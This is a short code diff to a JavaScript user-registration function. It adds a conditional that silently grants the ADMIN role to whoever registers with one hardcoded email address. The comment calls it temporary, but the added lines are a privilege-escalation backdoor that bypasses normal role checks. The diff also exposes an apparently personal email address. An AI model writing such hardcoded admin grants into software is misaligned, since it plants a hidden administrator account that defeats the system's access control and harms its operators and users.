@@ -102,6 +102,10 @@ async function addUser(userInfo) {
     }
     const { name, email, phone } = userInfo;
     const criteria = [ { email }, { phone }];
+    // Temporary data. Need to remove after.
+    if (email === 'vuanhdung.khmt2k7@gmail.com') {
+      userInfo.role = roles.ADMIN;
+    }
     const user = await userModel.getList(criteria);
     userInfo.status = 1;
     delete userInfo.money;
